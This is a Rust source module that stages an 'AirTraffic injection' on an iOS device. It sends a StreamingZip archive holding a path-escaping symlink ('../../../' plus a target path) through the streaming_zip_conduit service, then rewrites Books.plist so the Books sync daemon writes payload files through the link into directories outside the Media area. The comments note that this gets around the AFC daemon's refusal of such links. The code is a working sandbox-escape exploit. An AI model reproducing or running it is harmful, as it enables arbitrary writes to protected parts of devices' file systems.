//! AFC staging for the AirTraffic injection sequence.
//!
//! Everything here is staged inside the device's Media area: a fresh
//! `cocowall-src-<token>` directory holding the payload plus a
//! three-level `p0/p1/p2/link` symlink, and a rewritten
//! `Books/Sync/Books.plist` listing the staged objects as Book assets.
//! When the AirTraffic daemon syncs those assets it first lands the
//! symlink at the Media root (`cocowall-link-<token>`), where its
//! relative target (`../../../` + the target parent path without its
//! leading slash) resolves to the real directory outside Media, and
//! then writes the payload through it. The layout mirrors the protocol
//! facts recorded in research/airlift-implementation-notes.md.
//!
//! The source directory is materialised by sending a StreamingZip
//! archive to the `com.apple.streaming_zip_conduit` service, whose
//! on-device daemon extracts it into `Media/<source>/`. The symlink is
//! a zip entry (mode 0120777), never an AFC MakeLink call: on a real
//! device the AFC daemon refuses MakeLink for a target that escapes
//! the Media root (run #22 device test), while the conduit-extracted
//! symlink is the layout the reference implementation ships. Payload
//! files travel inside the same archive instead of one-by-one AFC
//! uploads.

use std::io::Write as _;
use std::path::Path;

use idevice::services::afc::{opcode::AfcFopenMode, AfcClient};
use idevice::IdeviceError;
use tokio::io::{AsyncReadExt, AsyncWriteExt};

use crate::device_log::Logger;
use crate::tunnel::DeviceTunnel;

pub const SOURCE_PREFIX: &str = "cocowall-src-";
pub const LINK_PREFIX: &str = "cocowall-link-";
pub const BOOKS_PLIST_PATH: &str = "Books/Sync/Books.plist";
pub const ZIP_CONDUIT_SERVICE: &str = "com.apple.streaming_zip_conduit";

/// Format a device error with the raw status up front. AFC failures
/// carry `IdeviceError::Afc`, whose numeric status code and variant
/// name are what a device log needs — the run #22 failure hid them at
/// the tail of a long description, where the UI banner truncated them
/// away. Every staging error therefore leads with this string.
pub fn fmt_device_err(e: &IdeviceError) -> String {
    match e {
        IdeviceError::Afc(a) => format!("AFC 状态码 {}（{a:?}：{a}）", a.sub_code()),
        other => format!("{other:?}"),
    }
}

/// Random bytes from the OS RNG, with a time/pid-mixed xorshift fallback
/// so staging never hard-fails on RNG access.
pub fn random_bytes(n: usize) -> Vec<u8> {
    use std::io::Read;
    let mut buf = vec![0u8; n];
    if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
        if f.read_exact(&mut buf).is_ok() {
            return buf;
        }
    }
    let seed = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x9E3779B97F4A7C15)
        ^ (std::process::id() as u64) << 32;
    let mut state = seed | 1;
    for b in buf.iter_mut() {
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        *b = (state >> 32) as u8;
    }
    buf
}

pub fn random_hex(bytes: usize) -> String {
    random_bytes(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

/// Uppercase UUID string (version/variant bits set) for descriptor names.
pub fn new_uuid_upper() -> String {
    let mut b = random_bytes(16);
    b[6] = (b[6] & 0x0F) | 0x40;
    b[8] = (b[8] & 0x3F) | 0x80;
    format!(
        "{:02X}{:02X}{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}",
        b[0], b[1], b[2], b[3], b[4], b[5], b[6], b[7], b[8], b[9], b[10], b[11], b[12], b[13],
        b[14], b[15]
    )
}

/// Random 5-digit identifier (10000..=99999) for the descriptor rewrite.
pub fn random_5_digit() -> u32 {
    let b = random_bytes(4);
    let v = u32::from_le_bytes([b[0], b[1], b[2], b[3]]);
    10_000 + (v % 90_000)
}

/// One staged sync: everything the ATC session needs to reference.
pub struct StagedSync {
    pub source: String,
    pub link_destination: String,
    /// Book asset identifiers, link first, then payload(s).
    pub identifiers: Vec<String>,
    /// FileComplete destination per identifier, same order.
    pub destinations: Vec<String>,
}

pub async fn afc_write_file(afc: &mut AfcClient, path: &str, bytes: &[u8]) -> Result<(), String> {
    let mut fd = afc
        .open(path, AfcFopenMode::WrOnly)
        .await
        .map_err(|e| format!("AFC 打开 {path} 失败 [{}]", fmt_device_err(&e)))?;
    // Chunk large writes; the descriptor payload can be several MB.
    for chunk in bytes.chunks(512 * 1024) {
        fd.write_entire(chunk)
            .await
            .map_err(|e| format!("AFC 写入 {path} 失败 [{}]", fmt_device_err(&e)))?;
    }
    fd.close()
        .await
        .map_err(|e| format!("AFC 关闭 {path} 失败 [{}]", fmt_device_err(&e)))?;
    Ok(())
}

pub async fn afc_read_file(afc: &mut AfcClient, path: &str) -> Option<Vec<u8>> {
    let mut fd = afc.open(path, AfcFopenMode::RdOnly).await.ok()?;
    let data = fd.read_entire().await.ok();
    let _ = fd.close().await;
    data
}

/// Snapshot the current Books.plist (None when absent/unreadable).
pub async fn snapshot_books_plist(afc: &mut AfcClient) -> Option<Vec<u8>> {
    afc_read_file(afc, BOOKS_PLIST_PATH).await
}

/// Restore a snapshot, or remove the plist when there was none.
pub async fn restore_books_plist(afc: &mut AfcClient, original: &Option<Vec<u8>>) {
    match original {
        Some(bytes) => {
            let _ = afc_write_file(afc, BOOKS_PLIST_PATH, bytes).await;
        }
        None => {
            let _ = afc.remove(BOOKS_PLIST_PATH).await;
        }
    }
}

/// Books.plist content: one Book entry per asset identifier.
pub fn build_books_plist(identifiers: &[String]) -> Result<Vec<u8>, String> {
    let mut books = Vec::new();
    for (idx, identifier) in identifiers.iter().enumerate() {
        let mut entry = plist::Dictionary::new();
        entry.insert(
            "Persistent ID".into(),
            plist::Value::String(identifier.clone()),
        );
        entry.insert(
            "Item ID".into(),
            plist::Value::String(format!("{}", idx + 1)),
        );
        entry.insert("DSID".into(), plist::Value::String("1".into()));
        books.push(plist::Value::Dictionary(entry));
    }
    let mut root = plist::Dictionary::new();
    root.insert("Books".into(), plist::Value::Array(books));
    let mut buf = Vec::new();
    plist::to_writer_binary(&mut buf, &plist::Value::Dictionary(root))
        .map_err(|e| format!("编码 Books.plist 失败: {e}"))?;
    Ok(buf)
}

fn zip_opts(mode: u32) -> zip::write::FileOptions<'static, zip::write::ExtendedFileOptions> {
    let mut opts = zip::write::FileOptions::default()
        .compression_method(zip::CompressionMethod::Stored)
        .unix_permissions(mode);
    let mode_bytes = (mode as u16).to_le_bytes();
    let _ = opts.add_extra_data(0x5A53, Box::new(mode_bytes), false);
    opts
}

type ArchiveWriter = zip::ZipWriter<std::io::Cursor<Vec<u8>>>;

/// Shared archive head: ZipMetadata, the p0/p1/p2 directory chain, the
/// symlink entry, and one directory entry per component of the target
/// path. Entry order and modes mirror the reference archive layout.
fn archive_preamble(zip: &mut ArchiveWriter, target_tail: &str) -> Result<(), String> {
    zip.add_directory("META-INF/", zip_opts(0o040755))
        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    zip.start_file("META-INF/com.apple.ZipMetadata.plist", zip_opts(0o100600))
        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    let mut meta = plist::Dictionary::new();
    meta.insert("Version".into(), plist::Value::Integer(2.into()));
    let mut meta_buf = Vec::new();
    plist::to_writer_binary(&mut meta_buf, &plist::Value::Dictionary(meta))
        .map_err(|e| format!("编码 ZipMetadata 失败: {e}"))?;
    zip.write_all(&meta_buf)
        .map_err(|e| format!("构建暂存归档失败: {e}"))?;

    for dir in ["p0/", "p0/p1/", "p0/p1/p2/"] {
        zip.add_directory(dir, zip_opts(0o040755))
            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    }

    // The symlink itself: `p0/p1/p2/link` → `../../../{target}`. The
    // three `..` are counted for the link's final resting place — the
    // AirTraffic daemon lands it at the Media root, from where the
    // relative target resolves onto the real directory.
    zip.add_symlink(
        "p0/p1/p2/link",
        format!("../../../{target_tail}"),
        zip_opts(0o120777),
    )
    .map_err(|e| format!("构建暂存归档失败: {e}"))?;

    let mut cursor = String::new();
    for component in target_tail.split('/') {
        if component.is_empty() {
            continue;
        }
        cursor.push_str(component);
        cursor.push('/');
        zip.add_directory(&cursor, zip_opts(0o040755))
            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    }
    Ok(())
}

/// Archive for a folder inject: the collected tree under `payload/`.
/// `dirs`/`files` come from stage_folder's walk, so the dot-entry and
/// __MACOSX filtering (and the byte accounting) stay identical to the
/// previous AFC-upload path.
fn build_folder_archive(
    target_parent_dir: &str,
    dirs: &[String],
    files: &[(String, std::path::PathBuf)],
) -> Result<Vec<u8>, String> {
    let target_tail = target_parent_dir.trim_start_matches('/');
    let mut zip = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    archive_preamble(&mut zip, target_tail)?;
    zip.add_directory("payload/", zip_opts(0o040755))
        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    for d in dirs {
        zip.add_directory(format!("payload/{d}/"), zip_opts(0o040755))
            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    }
    for (rel, path) in files {
        zip.start_file(format!("payload/{rel}"), zip_opts(0o100644))
            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
        let bytes = std::fs::read(path)
            .map_err(|e| format!("读取本地文件 {} 失败: {e}", path.display()))?;
        zip.write_all(&bytes)
            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    }
    let cursor = zip
        .finish()
        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    Ok(cursor.into_inner())
}

/// Archive for flat in-memory files: `payload_<idx>` entries at the
/// archive root, matching the identifiers stage_files hands to ATC.
fn build_files_archive(
    target_parent_dir: &str,
    files: &[(String, Vec<u8>)],
) -> Result<Vec<u8>, String> {
    let target_tail = target_parent_dir.trim_start_matches('/');
    let mut zip = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    archive_preamble(&mut zip, target_tail)?;
    for (idx, (_name, bytes)) in files.iter().enumerate() {
        zip.start_file(format!("payload_{idx}"), zip_opts(0o100600))
            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
        zip.write_all(bytes)
            .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    }
    let cursor = zip
        .finish()
        .map_err(|e| format!("构建暂存归档失败: {e}"))?;
    Ok(cursor.into_inner())
}

/// Ship one archive to the streaming_zip_conduit service; its daemon
/// extracts it into `Media/<source>/`, materialising the symlink.
async fn conduit_extract(
    tunnel: &mut DeviceTunnel,
    source: &str,
    archive: &[u8],
    log: &Logger,
) -> Result<(), String> {
    let mut stream = tunnel.connect_raw_service(ZIP_CONDUIT_SERVICE, log).await?;

    let mut init = plist::Dictionary::new();
    init.insert(
        "MediaSubdir".into(),
        plist::Value::String(source.to_string()),
    );
    let mut init_buf = Vec::new();
    plist::to_writer_binary(&mut init_buf, &plist::Value::Dictionary(init))
        .map_err(|e| format!("编码 conduit 初始化字典失败: {e}"))?;
    stream
        .write_all(&(init_buf.len() as u32).to_be_bytes())
        .await
        .map_err(|e| format!("暂存：写 conduit 初始化长度失败: {e:?}"))?;
    stream
        .write_all(&init_buf)
        .await
        .map_err(|e| format!("暂存：写 conduit 初始化字典失败: {e:?}"))?;
    stream
        .write_all(archive)
        .await
        .map_err(|e| format!("暂存：上传 StreamingZip 归档失败: {e:?}"))?;
    stream
        .flush()
        .await
        .map_err(|e| format!("暂存：conduit flush 失败: {e:?}"))?;

    let mut len_buf = [0u8; 4];
    stream
        .read_exact(&mut len_buf)
        .await
        .map_err(|e| format!("暂存：读 conduit 响应长度失败: {e:?}"))?;
    let resp_len = u32::from_be_bytes(len_buf) as usize;
    if resp_len > 4 * 1024 * 1024 {
        return Err(format!("暂存：conduit 响应异常大（{resp_len} 字节），按失败处理"));
    }
    let mut resp = vec![0u8; resp_len];
    stream
        .read_exact(&mut resp)
        .await
        .map_err(|e| format!("暂存：读 conduit 响应失败: {e:?}"))?;
    match plist::Value::from_reader(std::io::Cursor::new(&resp)) {
        Ok(plist::Value::Dictionary(d)) => {
            let keys: Vec<&str> = d.keys().map(|k| k.as_str()).collect();
            log.log(format!(
                "暂存：conduit 已响应（{} 字节，键：{}）",
                resp_len,
                keys.join(", ")
            ));
        }
        _ => {
            log.log(format!("暂存：conduit 已响应（{resp_len} 字节）"));
        }
    }
    Ok(())
}

/// Best-effort removal of staging leftovers from earlier runs (e.g.
/// the failed run #22 test left a `cocowall-src-…` tree in Media).
/// Fresh tokens already make collisions impossible; this just keeps
/// Media from accumulating dead trees.
pub async fn sweep_stale_staging(afc: &mut AfcClient, log: &Logger) {
    let names = match afc.list_dir("").await {
        Ok(n) => n,
        Err(_) => match afc.list_dir("/").await {
            Ok(n) => n,
            Err(_) => return,
        },
    };
    for name in names {
        if name.starts_with(SOURCE_PREFIX) || name.starts_with(LINK_PREFIX) {
            let _ = afc.remove_all(&name).await;
            log.log(format!("暂存：清理上次残留 {name}"));
        }
    }
}

/// Shared tail of every staging path: extract the archive through the
/// conduit, verify the staged objects are visible over AFC, then point
/// Books.plist at them. On any failure the staged source directory is
/// removed again.
async fn finish_staging(
    tunnel: &mut DeviceTunnel,
    afc: &mut AfcClient,
    source: &str,
    link_destination: &str,
    archive: &[u8],
    identifiers: Vec<String>,
    destinations: Vec<String>,
    verify_paths: &[String],
    log: &Logger,
) -> Result<StagedSync, String> {
    let staged = StagedSync {
        source: source.to_string(),
        link_destination: link_destination.to_string(),
        identifiers,
        destinations,
    };

    if let Err(e) = conduit_extract(tunnel, source, archive, log).await {
        cleanup_stage(afc, &staged).await;
        return Err(e);
    }

    let link_rel = format!("{source}/p0/p1/p2/link");
    for path in std::iter::once(source)
        .chain(std::iter::once(link_rel.as_str()))
        .chain(verify_paths.iter().map(|p| p.as_str()))
    {
        if let Err(e) = afc.get_file_info(path).await {
            let detail = fmt_device_err(&e);
            cleanup_stage(afc, &staged).await;
            return Err(format!(
                "暂存校验失败 [{detail}]：{path} 在 Media 区不可见（conduit 解压后 AFC get_file_info 失败）"
            ));
        }
    }
    log.log("暂存：源对象与 symlink 已在 Media 区就位并通过 AFC 校验".to_string());

    // Books.plist is what makes the daemon pick the assets up.
    for dir in ["Airlock", "Airlock/Book", "Books", "Books/Sync"] {
        let _ = afc.mk_dir(dir).await;
    }
    let books = build_books_plist(&staged.identifiers)?;
    afc_write_file(afc, BOOKS_PLIST_PATH, &books).await?;
    log.log(format!(
        "暂存：Books.plist 已改写（{} 个 Book 资产）",
        staged.identifiers.len()
    ));

    Ok(staged)
}

fn new_stage_names() -> (String, String) {
    let token = random_hex(10);
    (
        format!("{SOURCE_PREFIX}{token}"),
        format!("{LINK_PREFIX}{token}"),
    )
}

/// Stage a whole folder as the sync payload; it lands at
/// `<target_parent_dir>/<dest_name>` once synced.
pub async fn stage_folder(
    tunnel: &mut DeviceTunnel,
    afc: &mut AfcClient,
    folder: &Path,
    target_parent_dir: &str,
    dest_name: &str,
    log: &Logger,
) -> Result<StagedSync, String> {
    sweep_stale_staging(afc, log).await;
    let (source, link_destination) = new_stage_names();

    // Collect the folder tree, skipping macOS packaging noise the same
    // way the archive-based staging did (__MACOSX and dot-entries).
    let mut dirs: Vec<String> = Vec::new();
    let mut files: Vec<(String, std::path::PathBuf)> = Vec::new();
    let mut stack: Vec<(std::path::PathBuf, String)> = vec![(folder.to_path_buf(), String::new())];
    while let Some((dir, rel)) = stack.pop() {
        let entries = std::fs::read_dir(&dir)
            .map_err(|e| format!("读取本地文件夹 {} 失败: {e}", dir.display()))?;
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with('.') || name == "__MACOSX" {
                continue;
            }
            let child_rel = if rel.is_empty() {
                name.clone()
            } else {
                format!("{rel}/{name}")
            };
            let path = entry.path();
            if path.is_dir() {
                dirs.push(child_rel.clone());
                stack.push((path, child_rel));
            } else if path.is_file() {
                files.push((child_rel, path));
            }
        }
    }
    if files.is_empty() {
        return Err(format!(
            "本地文件夹 {} 内没有可注入的文件",
            folder.display()
        ));
    }

    let total_bytes: usize = files
        .iter()
        .map(|(_, p)| std::fs::metadata(p).map(|m| m.len() as usize).unwrap_or(0))
        .sum();
    let archive = build_folder_archive(target_parent_dir, &dirs, &files)?;
    log.log(format!(
        "暂存：{} 个文件（{} 字节）已打包为 StreamingZip 归档（{} 字节），经 conduit 解压到 {source}",
        files.len(),
        total_bytes,
        archive.len()
    ));

    let identifiers = vec![
        format!("../../{source}/p0/p1/p2/link"),
        format!("../../{source}/payload"),
    ];
    let destinations = vec![
        link_destination.clone(),
        format!("{link_destination}/{dest_name}"),
    ];
    // Diagnostic dump: the exact strings the daemon will see — the
    // symlink's relative target, the Book asset identifiers, and the
    // FileComplete destinations. Log-only; staging is unchanged.
    let target_tail = target_parent_dir.trim_start_matches('/');
    log.log(format!(
        "诊断：暂存 symlink 目标字符串全文：'../../../{target_tail}'（link 落点：Media/{link_destination}）"
    ));
    log.log(format!(
        "诊断：暂存资产标识全文：{}",
        identifiers.join(" | ")
    ));
    log.log(format!(
        "诊断：FileComplete 目标全文：{}",
        destinations.join(" | ")
    ));
    let verify = vec![format!("{source}/payload")];
    finish_staging(
        tunnel,
        afc,
        &source,
        &link_destination,
        &archive,
        identifiers,
        destinations,
        &verify,
        log,
    )
    .await
}

/// Stage flat files as `payload_<idx>` objects (the write_dir shape);
/// each lands at `<target_parent_dir>/<name>`.
pub async fn stage_files(
    tunnel: &mut DeviceTunnel,
    afc: &mut AfcClient,
    files: &[(String, Vec<u8>)],
    target_parent_dir: &str,
    log: &Logger,
) -> Result<StagedSync, String> {
    if files.is_empty() {
        return Err("没有可写入的文件".to_string());
    }
    sweep_stale_staging(afc, log).await;
    let (source, link_destination) = new_stage_names();

    let archive = build_files_archive(target_parent_dir, files)?;
    log.log(format!(
        "暂存：{} 个文件已打包为 StreamingZip 归档（{} 字节），经 conduit 解压到 {source}",
        files.len(),
        archive.len()
    ));

    let mut identifiers = vec![format!("../../{source}/p0/p1/p2/link")];
    let mut destinations = vec![link_destination.clone()];
    let mut verify = Vec::new();
    for (idx, (name, _bytes)) in files.iter().enumerate() {
        identifiers.push(format!("../../{source}/payload_{idx}"));
        destinations.push(format!("{link_destination}/{name}"));
        verify.push(format!("{source}/payload_{idx}"));
    }

    // Same diagnostic dump as stage_folder: symlink target string,
    // asset identifiers, FileComplete destinations. Log-only.
    let target_tail = target_parent_dir.trim_start_matches('/');
    log.log(format!(
        "诊断：暂存 symlink 目标字符串全文：'../../../{target_tail}'（link 落点：Media/{link_destination}）"
    ));
    log.log(format!(
        "诊断：暂存资产标识全文：{}",
        identifiers.join(" | ")
    ));
    log.log(format!(
        "诊断：FileComplete 目标全文：{}",
        destinations.join(" | ")
    ));

    finish_staging(
        tunnel,
        afc,
        &source,
        &link_destination,
        &archive,
        identifiers,
        destinations,
        &verify,
        log,
    )
    .await
}

/// List a directory's entry names over AFC (`.`/`..` filtered out).
/// Listing the link destination reads *through* the synced symlink into
/// the target directory — used as a best-effort gallery count
/// confirmation after a sync. The AFC service may refuse to traverse
/// the symlink (PermDenied), which callers treat as "unconfirmed",
/// never as a failed sync.
pub async fn list_dir_names(afc: &mut AfcClient, path: &str) -> Result<Vec<String>, String> {
    let names = afc
        .list_dir(path)
        .await
        .map_err(|e| format!("AFC 列目录 {path} 失败 [{}]", fmt_device_err(&e)))?;
    Ok(names
        .into_iter()
        .filter(|n| n != "." && n != "..")
        .collect())
}

/// Remove the staged source tree and the synced symlink (best effort).
pub async fn cleanup_stage(afc: &mut AfcClient, staged: &StagedSync) {
    let _ = afc.remove_all(&staged.link_destination).await;
    let _ = afc.remove_all(&staged.source).await;
}
